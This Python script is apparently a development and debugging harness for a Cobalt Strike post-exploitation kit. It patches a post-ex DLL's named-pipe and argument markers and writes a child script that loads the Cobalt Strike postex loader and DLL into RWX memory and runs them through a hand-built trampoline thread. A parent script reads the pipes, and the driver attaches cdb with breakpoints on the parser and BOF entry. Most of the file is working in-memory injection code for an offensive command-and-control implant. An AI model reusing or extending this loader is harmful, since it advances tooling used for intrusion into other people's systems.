# -*- coding: utf-8 -*-
"""kit2_wire_probe.py - two-pipe child + gated cdb: bp 0x1733 (dump the five
consumed header ints + remaining size), 0x1759/0x176b (parser/fixer verdicts
via ? rax... actually eax at test), 0x1820 (BOF entry call = success)."""
import ctypes
import os
import struct
import subprocess
import sys
import time
from ctypes import wintypes as wt

STAMP = str(int(time.time()))
CTRL = r"\\.\pipe\kit_wp_c_" + STAMP
OUT = r"\\.\pipe\kit_wp_o_" + STAMP
GATE = r"C:\Users\Public\kit2_go.txt"
if os.path.exists(GATE):
    os.remove(GATE)

sys.path.insert(0, r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-beacon\feat-post-4.9.1\tools")
import kit_local_harness2 as H

WIRE = H.FULL + struct.pack(">i", 0)
ARGS = (struct.pack(">i", 1) + struct.pack(">i", 2) + struct.pack(">i", 1)
        + H.L(b"ntdll.dll!RtlUserThreadStart+0x21\x00")
        + H.L(OUT.encode() + b"\x00") + H.L(WIRE))

PIPEMARK = b"POST_EX_PIPE_NAME_PLEASE_DO_NOT_CHANGE_OR_REMOVE"
FULLPIPE_MARK = b"\\\\.\\pipe\\" + PIPEMARK
ARGSMARK = b"_POSTEX_ARGUMENTS_"


def patch_kit(data, ctrl):
    d = bytearray(data)
    i = bytes(d).find(FULLPIPE_MARK)
    assert i > 0
    name = ctrl.encode() + b"\x00"
    name = name + b"\x00" * (len(FULLPIPE_MARK) - len(name))
    d[i:i + len(FULLPIPE_MARK)] = name
    i = bytes(d).find(ARGSMARK)
    assert i > 0
    hdr = (struct.pack("<i", 0x0A2A1DE0) + b"AAAA" + b"N" + b"\x00\x00\x00"
           + struct.pack("<i", 1 << 20) + struct.pack("<i", len(ARGS)))
    d[i:i + 20] = hdr
    return bytes(d)


CHILD = r"C:\Users\Public\kit2_child.py"
child_src = (
    "import ctypes, struct, sys, time, os\n"
    "from ctypes import wintypes\n"
    "CTRL = sys.argv[1]; OUT = sys.argv[2]\n"
    "sys.path.insert(0, r'C:\\Users\\Administrator\\Desktop\\cobaltstrike\\cobaltstrike-beacon\\feat-post-4.9.1\\tools')\n"
    "import kit2_wire_probe as W\n"
    "k32 = ctypes.windll.kernel32\n"
    "k32.VirtualAlloc.restype = ctypes.c_void_p\n"
    "dll = W.patch_kit(open(r'C:\\Users\\Public\\kit_async.x64.dll', 'rb').read(), CTRL)\n"
    "loader = open(r'C:\\Users\\Administrator\\Desktop\\cobaltstrike\\cobaltstrike-ts\\p3-llvm-bench\\src\\main\\resources\\resources\\postex-loader.x64.bin', 'rb').read()\n"
    "blob = loader + dll\n"
    "base = k32.VirtualAlloc(None, len(blob), 0x3000, 0x40)\n"
    "ctypes.memmove(base, blob, len(blob))\n"
    "ab = k32.VirtualAlloc(None, len(W.ARGS), 0x3000, 0x04)\n"
    "ctypes.memmove(ab, W.ARGS, len(W.ARGS))\n"
    "tramp = k32.VirtualAlloc(None, 0x1000, 0x3000, 0x40)\n"
    "code = bytearray(11)\n"
    "code[0] = 0x41; code[1] = 0xB9; code[2:6] = struct.pack('<I', 1)\n"
    "code[6] = 0xE9\n"
    "code[7:11] = struct.pack('<i', base - (tramp + 11))\n"
    "ctypes.memmove(tramp, bytes(code), 11)\n"
    "print('pid', os.getpid(), 'blob', hex(base), flush=True)\n"
    "while not os.path.exists(r'" + GATE + "'):\n"
    "    time.sleep(0.2)\n"
    "k32.CreateThread(None, 0, ctypes.cast(tramp, wintypes.LPVOID), ctypes.c_void_p(ab), 0, None)\n"
    "time.sleep(70)\n"
    "print('SURVIVED', flush=True)\n"
)
open(CHILD, "w").write(child_src)

PARENT = r"C:\Users\Public\kit2_parent2.py"
parent_src = (
    "import time, ctypes, sys, os, threading\n"
    "from ctypes import wintypes\n"
    "k32 = ctypes.windll.kernel32\n"
    "k32.CreateFileW.restype = wintypes.HANDLE\n"
    "def open_pipe(name, timeout=30):\n"
    "    t0 = time.time()\n"
    "    while time.time() - t0 < timeout:\n"
    "        h = k32.CreateFileW(name, 0xC0000000, 0, None, 3, 0, None)\n"
    "        if h and h != wintypes.HANDLE(-1).value:\n"
    "            return h\n"
    "        time.sleep(0.2)\n"
    "    return None\n"
    "CTRL, OUT = sys.argv[1], sys.argv[2]\n"
    "while not os.path.exists(r'" + GATE + "'):\n"
    "    time.sleep(0.1)\n"
    "hc = open_pipe(CTRL, 20)\n"
    "ho = open_pipe(OUT, 60)\n"
    "print('ctrl:', hc is not None, 'out:', ho is not None, flush=True)\n"
    "def reader(h):\n"
    "    while True:\n"
    "        buf = ctypes.create_string_buffer(65536)\n"
    "        got = wintypes.DWORD(0)\n"
    "        if k32.ReadFile(h, buf, 65536, ctypes.byref(got), None) and got.value:\n"
    "            print('RECV:', bytes(c if 32 <= c < 127 else 46 for c in buf.raw[:got.value][:80]).decode(), flush=True)\n"
    "        else:\n"
    "            time.sleep(0.3)\n"
    "if ho:\n"
    "    threading.Thread(target=reader, args=(ho,), daemon=True).start()\n"
    "if hc:\n"
    "    threading.Thread(target=reader, args=(hc,), daemon=True).start()\n"
    "time.sleep(40)\n"
    "print('done')\n"
)
open(PARENT, "w").write(parent_src)

if __name__ != "__main__":
    pass  # importable: STAMP/ARGS/patch_kit only; driver below
if __name__ == "__main__":
    p = subprocess.Popen([sys.executable, "-I", CHILD, CTRL, OUT], cwd=r"C:\Users\Public",
                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    line = p.stdout.readline().decode()
    pid = int(line.split()[1])
    blobbase = int(line.split()[3], 16)
    print("pid", pid, "blob", hex(blobbase))
    p2 = subprocess.Popen([sys.executable, "-I", PARENT, CTRL, OUT], cwd=r"C:\Users\Public",
                          stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    open(GATE, "w").write("go")

    # find the mapped image base (page-aligned back-compute from the OUT marker)
    k32 = ctypes.windll.kernel32
    k32.OpenProcess.restype = wt.HANDLE
    k32.ReadProcessMemory.argtypes = [wt.HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
    hp = k32.OpenProcess(0x1F0FFF, False, pid)


    class MBI(ctypes.Structure):
        _fields_ = [("BaseAddress", ctypes.c_void_p), ("AllocationBase", ctypes.c_void_p),
                    ("AllocationProtect", wt.DWORD), ("RegionSize", ctypes.c_size_t),
                    ("State", wt.DWORD), ("Protect", wt.DWORD), ("Type", wt.DWORD)]


    k32.VirtualQueryEx.argtypes = [wt.HANDLE, ctypes.c_void_p, ctypes.POINTER(MBI), ctypes.c_size_t]
    marker = OUT[9:].encode()
    buf = ctypes.create_string_buffer(0x100000)
    image_base = None
    t0 = time.time()
    while time.time() - t0 < 10 and image_base is None:
        addr = 0x10000
        while addr < 0x7FFFFFFFFFFF:
            mbi = MBI()
            if not k32.VirtualQueryEx(hp, ctypes.c_void_p(addr), ctypes.byref(mbi), ctypes.sizeof(MBI)):
                addr += 0x10000
                continue
            if mbi.BaseAddress is None or mbi.RegionSize is None:
                addr += 0x10000
                continue
            if mbi.State == 0x1000 and mbi.Protect in (0x02, 0x04, 0x40) and mbi.RegionSize <= 0x100000:
                got = ctypes.c_size_t()
                if k32.ReadProcessMemory(hp, ctypes.c_void_p(mbi.BaseAddress), buf,
                                         min(mbi.RegionSize, 0x100000), ctypes.byref(got)):
                    data = buf.raw[:got.value]
                    idx = data.find(marker)
                    while idx >= 0:
                        hit = mbi.BaseAddress + idx
                        cand = hit - 0x3d439
                        if cand > 0x10000000 and (cand & 0xFFF) == 0 and cand != blobbase:
                            image_base = cand
                        idx = data.find(marker, idx + 1)
            addr = mbi.BaseAddress + mbi.RegionSize
        if image_base is None:
            time.sleep(0.3)
    k32.CloseHandle(hp)
    print("image:", hex(image_base) if image_base else None)
    assert image_base

    CMDS = r"C:\Users\Public\kit2_wp_cmds.txt"
    open(CMDS, "w").write(
        # after the five header ints: dump the 20 consumed bytes + remaining size
        'bp 0x%x ".echo FIVE_INTS_DONE; dd @rdi+0x48 L8; ? @ebx; g"\n'
        # parser verdict
        'bp 0x%x ".echo PARSE_RESULT; ? @eax; dd @rsp+0x40 L10; g"\n'
        # fixer verdict
        'bp 0x%x ".echo FIX_RESULT; ? @eax; g"\n'
        # BOF entry call
        'bp 0x%x ".echo BOF_ENTRY_CALL; ? @rsi; kv 3; g"\n'
        "g\n" % (image_base + 0x1733, image_base + 0x1759, image_base + 0x176b, image_base + 0x1811))
    OUTLOG = r"C:\Users\Public\kit2_wp_out.txt"
    CDB = r"C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps\cdbX64.exe"
    cdbp = subprocess.Popen([CDB, "-p", str(pid), "-cf", CMDS, "-logo", OUTLOG, "-y", "C:\\symbols"],
                            cwd=r"C:\Users\Public", stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
    try:
        cdbp.wait(timeout=90)
    except Exception:
        cdbp.kill()
    try:
        p2.wait(timeout=70)
    except Exception:
        p2.kill()
    p.kill()
    d = open(OUTLOG, encoding="utf-8", errors="replace").read()
    for tag in ("FIVE_INTS_DONE", "PARSE_RESULT", "FIX_RESULT", "BOF_ENTRY_CALL"):
        i = d.find(tag, 300)
        while i > 0 and "bp" in d[i - 30:i]:
            i = d.find(tag, i + 10)
        print("===", tag, "===", "HIT" if i > 0 else "miss")
        if i > 0:
            print(d[i:i + 420])
    print("=== PARENT ===")
    print(p2.stdout.read().decode(errors="replace")[:600])
